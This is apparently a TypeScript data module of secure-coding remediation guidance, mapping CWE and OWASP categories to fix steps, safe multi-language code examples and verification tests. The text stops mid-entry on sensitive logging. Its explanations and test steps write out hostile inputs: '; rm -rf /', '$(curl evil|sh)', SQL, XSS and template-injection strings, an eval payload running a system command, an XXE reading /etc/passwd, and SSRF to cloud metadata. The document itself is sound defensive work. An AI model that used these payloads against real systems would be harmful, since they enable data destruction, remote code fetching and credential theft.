import { ex, REF, type TopicMap } from './types.js';

export const CODE_TOPICS: TopicMap = {
  'command-injection': {
    cwe: ['CWE-78'],
    owasp: ['A03'],
    effort: 'hours',
    summary:
      'Run programs with an argument list and no shell, and validate any value that reaches a command.',
    why: 'If any part of a shell command comes from a user, file or network, an attacker can append their own commands (for example `; rm -rf /` or `$(curl evil|sh)`).',
    steps: [
      'Replace shell strings with an executable plus an argument array.',
      'Validate inputs against an allow-list (a fixed set of values, or a strict pattern).',
      'Avoid the shell entirely when a library function does the same job.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js',
        `// before: exec(\`convert \${file} out.png\`)\nimport { execFile } from 'node:child_process';\nexecFile('convert', [file, 'out.png'], (err, stdout) => { /* … */ });`,
      ),
      ex(
        'python',
        'python',
        'Python',
        `# before: os.system(f"ping {host}")\nimport subprocess, re\nif not re.fullmatch(r"[A-Za-z0-9.-]{1,253}", host): raise ValueError("bad host")\nsubprocess.run(["ping", "-c", "1", host], check=True, shell=False)`,
      ),
      ex(
        'java',
        'java',
        'Java',
        `// before: Runtime.getRuntime().exec("ping " + host)\nnew ProcessBuilder("ping", "-c", "1", host).redirectErrorStream(true).start();`,
      ),
      ex(
        'php',
        'php',
        'PHP',
        `// before: shell_exec("ping " . $_GET['h']);\n$host = escapeshellarg($_GET['h']);   // better: validate with filter_var(..., FILTER_VALIDATE_DOMAIN)\n$out = shell_exec("ping -c 1 " . $host);`,
      ),
      ex(
        'go',
        'go',
        'Go',
        `// before: exec.Command("sh", "-c", "ping "+host)\nexec.Command("ping", "-c", "1", host).Run()`,
      ),
      ex(
        'ruby',
        'ruby',
        'Ruby',
        `# before: system("ping #{host}")\nsystem("ping", "-c", "1", host)`,
      ),
    ],
    verify:
      'Test with inputs containing ; | $() and backticks; they must be rejected or treated as plain text.',
    references: [REF.owasp('OS_Command_Injection_Defense_Cheat_Sheet'), REF.cwe(78)],
  },
  'sql-injection': {
    cwe: ['CWE-89'],
    owasp: ['A03'],
    effort: 'hours',
    summary: 'Use parameterized queries (placeholders) or the ORM query builder for every query.',
    why: "Building SQL from strings lets an attacker change the meaning of the query to read, modify or delete any data (for example `' OR '1'='1`).",
    steps: [
      'Replace string building with placeholders and pass the values separately.',
      'For dynamic table or column names, map from an allow-list; placeholders cannot be used for identifiers.',
      'Give the application database user only the privileges it needs.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js (pg)',
        `// before: db.query(\`SELECT * FROM users WHERE id = \${id}\`)\nawait db.query('SELECT * FROM users WHERE id = $1', [id]);`,
      ),
      ex(
        'node',
        'javascript',
        'Node.js (mysql2)',
        `await conn.execute('SELECT * FROM users WHERE email = ?', [email]);`,
      ),
      ex(
        'python',
        'python',
        'Python (DB-API)',
        `# before: cur.execute(f"SELECT * FROM users WHERE id = {uid}")\ncur.execute("SELECT * FROM users WHERE id = %s", (uid,))`,
      ),
      ex(
        'django',
        'python',
        'Django ORM / raw',
        `User.objects.filter(id=uid)\nUser.objects.raw("SELECT * FROM auth_user WHERE id = %s", [uid])`,
      ),
      ex(
        'java',
        'java',
        'Java (JDBC)',
        `PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");\nps.setLong(1, id);`,
      ),
      ex(
        'php',
        'php',
        'PHP (PDO)',
        `$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');\n$stmt->execute(['id' => $id]);`,
      ),
      ex(
        'go',
        'go',
        'Go',
        `row := db.QueryRowContext(ctx, "SELECT name FROM users WHERE id = $1", id)`,
      ),
      ex(
        'dotnet',
        'csharp',
        'C#',
        `var cmd = new SqlCommand("SELECT * FROM Users WHERE Id = @id", conn);\ncmd.Parameters.AddWithValue("@id", id);`,
      ),
    ],
    verify:
      "Send x' OR '1'='1 and a single quote as input; the query must return no extra rows and no database error.",
    references: [
      REF.owasp('SQL_Injection_Prevention_Cheat_Sheet'),
      REF.owasp('Query_Parameterization_Cheat_Sheet'),
    ],
  },
  'nosql-injection': {
    cwe: ['CWE-943'],
    owasp: ['A03'],
    effort: 'hours',
    summary: 'Validate and coerce request values to expected types before using them in a query.',
    why: 'Passing a request object straight into a query lets an attacker send operators such as {"$ne": null} to bypass checks (for example logging in without a password).',
    steps: [
      'Validate the body with a schema (zod, joi, Pydantic) and coerce fields to strings or numbers.',
      'Reject keys that start with $ and values that are objects where a scalar is expected.',
      'Hash and compare passwords in code, not in the query.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js (zod)',
        `import { z } from 'zod';\nconst { email } = z.object({ email: z.string().email() }).parse(req.body);\nconst user = await User.findOne({ email });   // email is now guaranteed to be a string`,
      ),
    ],
    verify: 'Post {"email": {"$ne": null}} and confirm a 400 response.',
    references: [REF.owasp('Injection_Prevention_Cheat_Sheet')],
  },
  'code-eval': {
    cwe: ['CWE-95'],
    owasp: ['A03'],
    effort: 'hours',
    summary: 'Replace eval-style execution with a parser or a lookup table of allowed operations.',
    why: "Executing a string as code lets an attacker run any code with the application's privileges when part of the string is influenced by input.",
    steps: [
      'Use JSON.parse / ast.literal_eval for data, and a dispatch map for choosing behaviour.',
      'If you truly need user-supplied logic, run it in an isolated sandbox with no secrets or network.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Dispatch table instead of eval',
        `const ops = { add: (a, b) => a + b, sub: (a, b) => a - b };\nconst fn = ops[name];\nif (!fn) throw new Error('unknown operation');\nreturn fn(a, b);`,
      ),
      ex(
        'python',
        'python',
        'Python',
        `import ast\nvalue = ast.literal_eval(text)   # literals only, never executes code`,
      ),
    ],
    verify: 'Pass input such as __import__("os").system("id") or process.exit(); it must not run.',
    references: [REF.owasp('Injection_Prevention_Cheat_Sheet'), REF.cwe(95)],
  },
  ssti: {
    cwe: ['CWE-1336', 'CWE-94'],
    owasp: ['A03'],
    effort: 'hours',
    summary:
      'Render fixed template files and pass user data as variables, never as template source.',
    why: 'Template engines can execute expressions; if user text becomes part of the template, an attacker can run code on the server (for example {{7*7}} then {{config}} or worse).',
    steps: [
      'Keep template source in files; pass values through the render context.',
      'Turn on sandboxing where the engine offers it.',
    ],
    examples: [
      ex(
        'flask',
        'python',
        'Flask',
        `# before: render_template_string("Hello " + name)\nreturn render_template("hello.html", name=name)   # hello.html: Hello {{ name }}`,
      ),
    ],
    verify: 'Submit {{7*7}}; the page must show it literally, not 49.',
    references: [REF.owasp('Server_Side_Template_Injection_Prevention_Cheat_Sheet')],
  },
  'ldap-xpath-injection': {
    cwe: ['CWE-90', 'CWE-643'],
    owasp: ['A03'],
    effort: 'hours',
    summary: 'Escape or parameterize values placed into LDAP filters and XPath expressions.',
    why: 'Unescaped input can change the filter and bypass authentication or leak directory data.',
    steps: [
      "Use your library's escaping helper (ldap3.utils.conv.escape_filter_chars, Spring LdapEncoder) or parameterized XPath.",
    ],
    examples: [
      ex(
        'python',
        'python',
        'Python ldap3',
        `from ldap3.utils.conv import escape_filter_chars\nflt = f"(uid={escape_filter_chars(username)})"`,
      ),
    ],
    verify: 'Input containing * ) ( must be escaped and not widen the search.',
    references: [REF.owasp('LDAP_Injection_Prevention_Cheat_Sheet')],
  },
  'xss-dom': {
    cwe: ['CWE-79'],
    owasp: ['A03'],
    effort: 'hours',
    summary:
      'Insert text with textContent; sanitize with DOMPurify when HTML is genuinely required.',
    why: "Writing untrusted text through innerHTML or document.write lets an attacker run scripts in your users' sessions (steal sessions, act as the user).",
    steps: [
      'Use textContent / createElement / framework bindings for data.',
      'When HTML must be rendered, sanitize with DOMPurify and keep a strict Content-Security-Policy.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Plain text',
        `// before: el.innerHTML = userName;\nel.textContent = userName;`,
      ),
      ex(
        'node',
        'javascript',
        'When HTML is required',
        `import DOMPurify from 'dompurify';\nel.innerHTML = DOMPurify.sanitize(html);`,
      ),
    ],
    verify: 'Submit <img src=x onerror=alert(1)>; it must display as text and no alert appears.',
    references: [
      REF.owasp('DOM_based_XSS_Prevention_Cheat_Sheet'),
      REF.owasp('Cross_Site_Scripting_Prevention_Cheat_Sheet'),
    ],
  },
  'xss-framework-bypass': {
    cwe: ['CWE-79'],
    owasp: ['A03'],
    effort: 'hours',
    summary:
      'Keep automatic output escaping on; sanitize explicitly where raw HTML is unavoidable.',
    why: "Directives like dangerouslySetInnerHTML, v-html, |safe and {!! !!} turn off the framework's main XSS protection for that value.",
    steps: [
      'Remove the bypass and render values as text.',
      'If you must render HTML (rich text, Markdown), sanitize it on the server with an allow-list sanitizer first.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'React',
        `import DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />`,
      ),
      ex(
        'django',
        'python',
        'Django',
        `import nh3\nclean = nh3.clean(user_html)      # sanitize first\n# template: {{ clean|safe }}  (only on the sanitized value)`,
      ),
    ],
    verify: 'Submit script and event-handler payloads; they must not execute.',
    references: [REF.owasp('Cross_Site_Scripting_Prevention_Cheat_Sheet')],
  },
  'xss-reflected': {
    cwe: ['CWE-79'],
    owasp: ['A03'],
    effort: 'hours',
    summary:
      'Never write request data into HTML directly; use a template engine with auto-escaping or encode explicitly.',
    why: "Echoing input back unescaped lets an attacker craft a link that runs a script in the victim's browser.",
    steps: [
      'Render through a template engine that escapes by default.',
      'If you build strings by hand, HTML-encode every dynamic value.',
      'Return JSON with Content-Type: application/json for APIs.',
    ],
    examples: [
      ex(
        'express',
        'javascript',
        'Express',
        `// before: res.send('<p>Hello ' + req.query.name + '</p>')\nimport escapeHtml from 'escape-html';\nres.send(\`<p>Hello \${escapeHtml(String(req.query.name))}</p>\`);`,
      ),
      ex(
        'php',
        'php',
        'PHP',
        `// before: echo $_GET['q'];\necho htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');`,
      ),
      ex(
        'flask',
        'python',
        'Flask',
        `from markupsafe import escape\nreturn f"<p>Hello {escape(name)}</p>"`,
      ),
    ],
    verify: 'Request ?name=<script>alert(1)</script>; the response must contain &lt;script&gt;.',
    references: [REF.owasp('Cross_Site_Scripting_Prevention_Cheat_Sheet')],
  },
  'weak-hash': {
    cwe: ['CWE-328', 'CWE-327'],
    owasp: ['A02'],
    effort: 'hours',
    summary:
      'Use SHA-256 or better for integrity, and a password hashing function (argon2, bcrypt, scrypt) for passwords.',
    why: 'MD5 and SHA-1 have practical collision attacks and are billions of times too fast for password cracking.',
    steps: [
      'Swap the algorithm to SHA-256/SHA-3 where it is used for integrity or signatures.',
      'Plain checksums for cache keys are fine; passwords are not (see password storage).',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js',
        `crypto.createHash('sha256').update(data).digest('hex');`,
      ),
      ex('python', 'python', 'Python', `hashlib.sha256(data).hexdigest()`),
      ex('java', 'java', 'Java', `MessageDigest.getInstance("SHA-256")`),
    ],
    verify: 'Search for md5/sha1 usage again; remaining ones must be non-security checksums.',
    references: [REF.owasp('Cryptographic_Storage_Cheat_Sheet')],
  },
  'weak-cipher': {
    cwe: ['CWE-327'],
    owasp: ['A02'],
    effort: 'hours',
    summary: 'Use AES-256-GCM (or ChaCha20-Poly1305) with a fresh random nonce for every message.',
    why: 'DES, RC4 and ECB mode leak patterns or can be broken outright; unauthenticated modes let attackers tamper with ciphertext.',
    steps: [
      'Switch to an authenticated mode (GCM) from a vetted library.',
      'Generate a new random nonce per encryption and store it with the ciphertext.',
      'Keep keys in a secret manager and plan for rotation.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js',
        `import crypto from 'node:crypto';\nconst iv = crypto.randomBytes(12);\nconst c = crypto.createCipheriv('aes-256-gcm', key, iv);\nconst enc = Buffer.concat([c.update(plain), c.final()]);\nconst tag = c.getAuthTag();   // store iv + tag + enc`,
      ),
      ex(
        'python',
        'python',
        'Python (cryptography)',
        `from cryptography.hazmat.primitives.ciphers.aead import AESGCM\naes = AESGCM(key)               # 32 bytes\nnonce = os.urandom(12)\nct = aes.encrypt(nonce, plaintext, None)`,
      ),
      ex(
        'java',
        'java',
        'Java',
        `Cipher c = Cipher.getInstance("AES/GCM/NoPadding");\nc.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));`,
      ),
    ],
    verify:
      'Encrypting the same plaintext twice yields different ciphertexts, and tampering with a byte makes decryption fail.',
    references: [REF.owasp('Cryptographic_Storage_Cheat_Sheet')],
  },
  'insecure-random': {
    cwe: ['CWE-338'],
    owasp: ['A02'],
    effort: 'minutes',
    summary: 'Generate tokens, IDs and secrets with a cryptographically secure random source.',
    why: 'Math.random, random.random and rand() are predictable; an attacker who observes a few values can guess the next ones (session ids, reset tokens).',
    steps: ['Use the platform CSPRNG for anything an attacker must not guess.'],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js',
        `import crypto from 'node:crypto';\nconst token = crypto.randomBytes(32).toString('hex');`,
      ),
      ex('python', 'python', 'Python', `import secrets\ntoken = secrets.token_urlsafe(32)`),
      ex('java', 'java', 'Java', `byte[] b = new byte[32]; new SecureRandom().nextBytes(b);`),
      ex('php', 'php', 'PHP', `$token = bin2hex(random_bytes(32));`),
      ex('go', 'go', 'Go', `b := make([]byte, 32); _, _ = crypto_rand.Read(b)  // crypto/rand`),
    ],
    verify: 'Search for Math.random / random.* near token or password generation.',
    references: [REF.owasp('Cryptographic_Storage_Cheat_Sheet')],
  },
  'tls-verification-disabled': {
    cwe: ['CWE-295'],
    owasp: ['A02'],
    effort: 'minutes',
    summary: 'Remove the override and trust the right CA instead of turning verification off.',
    why: 'Disabling certificate checks lets anyone on the network path impersonate the server and read or alter the traffic, including credentials.',
    steps: [
      'Delete the flag.',
      'If the server uses a private CA, pass that CA bundle to the client (NODE_EXTRA_CA_CERTS, verify="/path/ca.pem").',
      'For local development use a locally trusted certificate (mkcert) rather than disabling checks.',
    ],
    examples: [
      ex(
        'node',
        'bash',
        'Node.js with a private CA',
        `NODE_EXTRA_CA_CERTS=/etc/ssl/private-ca.pem node server.js`,
      ),
      ex(
        'python',
        'python',
        'Python requests',
        `requests.get(url, verify="/etc/ssl/private-ca.pem")   # not verify=False`,
      ),
      ex(
        'go',
        'go',
        'Go',
        `pool := x509.NewCertPool(); pool.AppendCertsFromPEM(caPEM)\ntr := &http.Transport{TLSClientConfig: &tls.Config{RootCAs: pool}}`,
      ),
    ],
    verify: 'Connecting to a host with an invalid certificate must fail.',
    references: [REF.owasp('Transport_Layer_Security_Cheat_Sheet')],
  },
  'password-storage': {
    cwe: ['CWE-916', 'CWE-256'],
    owasp: ['A02', 'A07'],
    effort: 'hours',
    summary: 'Store passwords only as argon2id (or bcrypt/scrypt) hashes with a per-user salt.',
    why: 'Fast hashes can be cracked at billions of guesses per second after a breach; clear text is exposed immediately.',
    steps: [
      "Hash with a slow, salted password hash and verify with the library's compare function.",
      'Re-hash existing users on next login and force a reset if clear text or MD5 was ever stored.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js (argon2)',
        `import argon2 from 'argon2';\nconst hash = await argon2.hash(password);        // store this\nconst ok = await argon2.verify(hash, attempt);`,
      ),
      ex(
        'python',
        'python',
        'Python (argon2-cffi)',
        `from argon2 import PasswordHasher\nph = PasswordHasher()\nhash_ = ph.hash(password)\nph.verify(hash_, attempt)`,
      ),
      ex(
        'django',
        'python',
        'Django',
        `PASSWORD_HASHERS = ['django.contrib.auth.hashers.Argon2PasswordHasher', 'django.contrib.auth.hashers.PBKDF2PasswordHasher']`,
      ),
      ex(
        'php',
        'php',
        'PHP',
        `$hash = password_hash($password, PASSWORD_ARGON2ID);\npassword_verify($attempt, $hash);`,
      ),
      ex(
        'spring',
        'java',
        'Spring Security',
        `PasswordEncoder enc = Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8();`,
      ),
    ],
    verify:
      'Database rows hold strings starting with $argon2id$ or $2b$, never the password itself.',
    references: [REF.owasp('Password_Storage_Cheat_Sheet')],
  },
  'jwt-misuse': {
    cwe: ['CWE-347', 'CWE-345'],
    owasp: ['A07', 'A02'],
    effort: 'hours',
    summary: 'Always verify the signature, pin the allowed algorithm, and enforce expiry.',
    why: 'Skipping verification or accepting "none" lets anyone forge a token and become any user, including an administrator.',
    steps: [
      'Verify every token with the signing key and an explicit algorithm list (for example ["RS256"] or ["HS256"]).',
      'Reject expired tokens (do not set ignoreExpiration).',
      'Keep signing keys in a secret manager; use short lifetimes plus refresh tokens.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js (jsonwebtoken)',
        `jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'], issuer: 'api.example.com' });`,
      ),
      ex(
        'python',
        'python',
        'Python (PyJWT)',
        `jwt.decode(token, key, algorithms=["RS256"], audience="my-api")   # never verify=False`,
      ),
    ],
    verify: 'A token with a changed payload, alg:none, or past exp must be rejected with 401.',
    references: [REF.owasp('JSON_Web_Token_for_Java_Cheat_Sheet')],
  },
  'hardcoded-iv': {
    cwe: ['CWE-321', 'CWE-329'],
    owasp: ['A02'],
    effort: 'hours',
    summary:
      'Load keys from a secret manager and generate a fresh random IV/nonce for each encryption.',
    why: 'A fixed IV breaks the security of most modes (patterns leak, keystreams repeat), and a key in source is exposed to everyone with the code.',
    steps: [
      'Move the key to the environment or a secret manager.',
      'Generate the IV with a CSPRNG for every message and store it alongside the ciphertext.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js',
        `const key = Buffer.from(process.env.ENC_KEY_B64, 'base64');\nconst iv = crypto.randomBytes(12);`,
      ),
    ],
    verify:
      'Encrypting the same input twice gives different output; the key no longer appears in the repository.',
    references: [REF.owasp('Cryptographic_Storage_Cheat_Sheet')],
  },
  'hardcoded-secret': {
    cwe: ['CWE-798', 'CWE-259'],
    owasp: ['A07', 'A02'],
    effort: 'hours',
    summary:
      'Revoke and rotate the credential, load it from the environment or a secret manager, and keep it out of Git.',
    why: 'A credential in the repository is visible to everyone with access to the code and every clone, fork and CI log, and stays in history after deletion.',
    steps: [
      'Assume the value is compromised: rotate it at the provider.',
      'Read it at runtime from environment variables or a secret manager (Vault, AWS/GCP/Azure secret stores, Doppler).',
      'Remove it from history if it was ever pushed (git filter-repo), and add secret scanning to CI.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js',
        `const apiKey = process.env.PAYMENTS_API_KEY;\nif (!apiKey) throw new Error('PAYMENTS_API_KEY is not set');`,
      ),
      ex(
        'python',
        'python',
        'Python',
        `import os\napi_key = os.environ["PAYMENTS_API_KEY"]   # raises KeyError if missing`,
      ),
      ex(
        'github-actions',
        'yaml',
        'GitHub Actions secret',
        `env:\n  PAYMENTS_API_KEY: \${{ secrets.PAYMENTS_API_KEY }}`,
      ),
      ex(
        'docker',
        'yaml',
        'Docker Compose',
        `services:\n  app:\n    env_file: .env        # .env is in .gitignore\n    environment:\n      - DB_PASSWORD   # value comes from the shell/CI, not this file`,
      ),
      ex(
        'generic',
        'bash',
        'Scan history for leaks',
        `git log -p | grep -iE "(api[_-]?key|secret|password)\\s*[:=]"   # or use gitleaks / trufflehog`,
      ),
    ],
    verify: 'A secret scanner (gitleaks) finds nothing, and the old credential no longer works.',
    references: [REF.owasp('Secrets_Management_Cheat_Sheet')],
  },
  'insecure-session-cookie': {
    cwe: ['CWE-614', 'CWE-1004'],
    owasp: ['A05', 'A07'],
    effort: 'minutes',
    summary: 'Enable Secure, HttpOnly and SameSite on session and authentication cookies.',
    why: 'Without these flags cookies leak over HTTP, are readable by injected scripts, and are sent on cross-site requests.',
    steps: ['Set the flags in the session configuration.'],
    examples: [
      ex(
        'express',
        'javascript',
        'Express',
        `cookie: { secure: true, httpOnly: true, sameSite: 'lax' }`,
      ),
      ex(
        'django',
        'python',
        'Django',
        `SESSION_COOKIE_SECURE = True\nSESSION_COOKIE_HTTPONLY = True\nCSRF_COOKIE_SECURE = True`,
      ),
      ex(
        'flask',
        'python',
        'Flask',
        `SESSION_COOKIE_SECURE = True; SESSION_COOKIE_HTTPONLY = True; SESSION_COOKIE_SAMESITE = 'Lax'`,
      ),
    ],
    verify: 'Run a web scan: all cookies show Secure, HttpOnly and SameSite.',
    references: [REF.owasp('Session_Management_Cheat_Sheet')],
  },
  'weak-session-secret': {
    cwe: ['CWE-798', 'CWE-1391'],
    owasp: ['A07', 'A02'],
    effort: 'minutes',
    summary:
      'Generate a long random signing secret per environment and load it from configuration.',
    why: 'Anyone who knows or guesses the secret can forge session cookies or tokens and impersonate any user.',
    steps: [
      'Generate at least 32 random bytes and store them as a secret.',
      'Rotate the secret now: all existing sessions and tokens signed with the old one become invalid, which is intended.',
    ],
    examples: [
      ex('generic', 'bash', 'Generate a secret', `openssl rand -base64 48`),
      ex('django', 'python', 'Django', `SECRET_KEY = os.environ["DJANGO_SECRET_KEY"]`),
      ex(
        'express',
        'javascript',
        'Express',
        `session({ secret: process.env.SESSION_SECRET, resave: false, saveUninitialized: false })`,
      ),
    ],
    verify: 'The secret no longer appears in the repository and old sessions are rejected.',
    references: [REF.owasp('Session_Management_Cheat_Sheet')],
  },
  'auth-disabled': {
    cwe: ['CWE-352', 'CWE-306'],
    owasp: ['A01', 'A07'],
    effort: 'hours',
    summary:
      'Re-enable CSRF protection and authentication, and exempt only endpoints that genuinely cannot use them.',
    why: 'Disabled protections turn every state-changing endpoint into one that another website (CSRF) or an anonymous user can call.',
    steps: [
      'Remove the exemption or disable call.',
      'For token-based APIs without cookies, document why CSRF is not needed and require the token on every call.',
      'Review each permitAll / AllowAnonymous rule for unintended exposure.',
    ],
    examples: [
      ex(
        'spring',
        'java',
        'Spring Security',
        `http.authorizeHttpRequests(a -> a.requestMatchers("/public/**").permitAll().anyRequest().authenticated());\n// keep CSRF on for browser sessions`,
      ),
      ex(
        'django',
        'python',
        'Django',
        `# remove @csrf_exempt; send X-CSRFToken from your JS client`,
      ),
    ],
    verify: 'Calling the endpoint without a token or session returns 401/403.',
    references: [
      REF.owasp('Cross-Site_Request_Forgery_Prevention_Cheat_Sheet'),
      REF.owasp('Authorization_Cheat_Sheet'),
    ],
  },
  'cors-code': {
    cwe: ['CWE-942'],
    owasp: ['A05'],
    effort: 'minutes',
    summary: 'List the specific origins that need access instead of allowing every origin.',
    why: "A wildcard origin lets any website call your API from a visitor's browser, which matters whenever the API uses cookies or private data.",
    steps: ['Replace * / true with an allow-list of origins from configuration.'],
    examples: [
      ex(
        'express',
        'javascript',
        'Express',
        `app.use(cors({ origin: ['https://app.example.com'], credentials: true }));`,
      ),
      ex('fastapi', 'python', 'FastAPI', `allow_origins=["https://app.example.com"]`),
      ex('spring', 'java', 'Spring', `.allowedOrigins("https://app.example.com")`),
    ],
    verify: 'A request with a foreign Origin header is not echoed in Access-Control-Allow-Origin.',
    references: [REF.owasp('HTML5_Security_Cheat_Sheet')],
  },
  'mass-assignment': {
    cwe: ['CWE-915'],
    owasp: ['A01', 'A04'],
    effort: 'hours',
    summary: 'Copy only explicitly allowed fields from the request into your model.',
    why: 'Passing the whole body lets a client set fields you never intended (isAdmin, role, price, ownerId).',
    steps: ['Pick fields by name or validate with a schema that rejects unknown keys.'],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js',
        `const { name, email } = schema.parse(req.body);   // zod .strict()\nawait User.update({ name, email }, { where: { id: req.user.id } });`,
      ),
      ex('rails', 'ruby', 'Rails', `params.require(:user).permit(:name, :email)`),
      ex(
        'django',
        'python',
        'Django REST Framework',
        `class UserSerializer(ModelSerializer):\n    class Meta: model = User; fields = ['name', 'email']   # never '__all__'`,
      ),
    ],
    verify: 'Send an extra field such as {"isAdmin": true}; it must be ignored or rejected.',
    references: [REF.owasp('Mass_Assignment_Cheat_Sheet')],
  },
  'insecure-deserialization': {
    cwe: ['CWE-502'],
    owasp: ['A08'],
    effort: 'hours',
    summary:
      'Never deserialize untrusted data with formats that can create arbitrary objects; use JSON with schema validation.',
    why: 'pickle, Java serialization, unsafe YAML and similar formats can execute attacker-chosen code while being loaded.',
    steps: [
      'Switch to JSON (or protobuf) and validate the structure.',
      'Use yaml.safe_load; for Java use allow-list filters (ObjectInputFilter).',
      'If you must accept signed state, verify an HMAC before parsing.',
    ],
    examples: [
      ex(
        'python',
        'python',
        'Python',
        `# before: yaml.load(text)   /   pickle.loads(blob)\ndata = yaml.safe_load(text)\ndata = json.loads(blob)`,
      ),
      ex(
        'java',
        'java',
        'Java',
        `ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.example.dto.*;!*");\nois.setObjectInputFilter(filter);`,
      ),
      ex(
        'php',
        'php',
        'PHP',
        `$data = json_decode($input, true, 512, JSON_THROW_ON_ERROR);   // not unserialize()`,
      ),
    ],
    verify: 'Craft a payload that would execute code; it must be rejected rather than evaluated.',
    references: [REF.owasp('Deserialization_Cheat_Sheet')],
  },
  xxe: {
    cwe: ['CWE-611'],
    owasp: ['A05'],
    effort: 'hours',
    summary: 'Disable DTDs and external entities in every XML parser.',
    why: 'XML parsers can be told to fetch local files or internal URLs, leaking secrets or enabling server-side request forgery.',
    steps: [
      'Turn off DOCTYPE declarations and entity resolution for each parser you use.',
      'Prefer JSON where you control the format.',
    ],
    examples: [
      ex(
        'java',
        'java',
        'Java',
        `DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();\nf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nf.setXIncludeAware(false);`,
      ),
      ex(
        'python',
        'python',
        'Python',
        `from defusedxml import ElementTree   # drop-in, safe by default`,
      ),
      ex(
        'dotnet',
        'csharp',
        '.NET',
        `var settings = new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null };`,
      ),
    ],
    verify:
      'Submit XML with an external entity pointing at file:///etc/passwd; it must be refused.',
    references: [REF.owasp('XML_External_Entity_Prevention_Cheat_Sheet')],
  },
  ssrf: {
    cwe: ['CWE-918'],
    owasp: ['A10'],
    effort: 'hours',
    summary:
      'Never fetch a URL straight from the request: allow-list hosts, resolve and block private addresses, and drop redirects.',
    why: 'An attacker can make your server call internal services and cloud metadata endpoints (for example 169.254.169.254) and return or act on the results.',
    steps: [
      'Prefer IDs or fixed endpoints over user-supplied URLs.',
      'If URLs are needed: parse them, allow only https and an allow-list of hosts, resolve the name, and reject loopback, link-local and private ranges.',
      'Disable automatic redirects, set short timeouts, and use IMDSv2 on cloud hosts.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js',
        `const ALLOWED = new Set(['api.partner.com']);\nconst u = new URL(input);\nif (u.protocol !== 'https:' || !ALLOWED.has(u.hostname)) throw new Error('blocked');\nconst res = await fetch(u, { redirect: 'error', signal: AbortSignal.timeout(5000) });`,
      ),
    ],
    verify: 'Submit http://169.254.169.254/ and http://localhost:22/; both must be rejected.',
    references: [REF.owasp('Server_Side_Request_Forgery_Prevention_Cheat_Sheet')],
  },
  'path-traversal': {
    cwe: ['CWE-22'],
    owasp: ['A01'],
    effort: 'hours',
    summary:
      'Resolve the final path and verify it is inside the intended directory, or use IDs instead of paths.',
    why: 'Input like ../../etc/passwd lets an attacker read or overwrite files outside the folder you meant to expose.',
    steps: [
      'Map user input to server-side IDs, or normalise and check the result starts with the base directory.',
      'Run the process with minimal file-system permissions.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js',
        `const base = path.resolve('/srv/uploads');\nconst full = path.resolve(base, name);\nif (!full.startsWith(base + path.sep)) return res.sendStatus(400);\nres.sendFile(full);`,
      ),
      ex(
        'python',
        'python',
        'Python',
        `from werkzeug.utils import safe_join\nfull = safe_join(BASE_DIR, name)\nif full is None: abort(400)`,
      ),
      ex(
        'java',
        'java',
        'Java',
        `Path base = Paths.get("/srv/uploads").toRealPath();\nPath p = base.resolve(name).normalize();\nif (!p.startsWith(base)) throw new SecurityException();`,
      ),
    ],
    verify: 'Request ../../etc/passwd and ..%2f..%2f; both must fail.',
    references: [REF.owasp('Input_Validation_Cheat_Sheet'), REF.cwe(22)],
  },
  'open-redirect': {
    cwe: ['CWE-601'],
    owasp: ['A01'],
    effort: 'hours',
    summary: 'Redirect only to relative paths or to hosts on an allow-list.',
    why: 'Attackers send victims a link on your trusted domain that bounces them to a phishing site.',
    steps: [
      'Accept a short code or a relative path, never an arbitrary URL.',
      'If full URLs are needed, validate the host against an allow-list.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js',
        `const next = String(req.query.next ?? '/');\nconst safe = next.startsWith('/') && !next.startsWith('//') ? next : '/';\nres.redirect(safe);`,
      ),
    ],
    verify:
      'Request ?next=https://evil.example and //evil.example; both must land on your own site.',
    references: [REF.owasp('Unvalidated_Redirects_and_Forwards_Cheat_Sheet')],
  },
  'unsafe-upload': {
    cwe: ['CWE-434'],
    owasp: ['A04'],
    effort: 'hours',
    summary:
      'Generate your own file names, check type and size, and store uploads outside the web root.',
    why: 'Client-supplied names allow path tricks and overwriting; unrestricted types allow uploading scripts that the server may execute.',
    steps: [
      'Save with a random name (UUID) and a fixed extension chosen from the verified type.',
      'Check size and the real content type (magic bytes), not only the extension.',
      'Serve uploads from object storage or a separate domain with Content-Disposition: attachment.',
    ],
    examples: [
      ex(
        'node',
        'javascript',
        'Node.js (multer)',
        `const upload = multer({\n  storage: multer.diskStorage({ destination: '/srv/uploads', filename: (_r, f, cb) => cb(null, crypto.randomUUID()) }),\n  limits: { fileSize: 5 * 1024 * 1024 },\n  fileFilter: (_r, f, cb) => cb(null, ['image/png', 'image/jpeg'].includes(f.mimetype)),\n});`,
      ),
    ],
    verify:
      'Upload a file named ../../x.php or shell.php.png; it must not land outside the folder or execute.',
    references: [REF.owasp('File_Upload_Cheat_Sheet')],
  },
  'sensitive-logging': {
    cwe: ['CWE-532'],
    owasp: ['A09'],
    effort: 'hours',
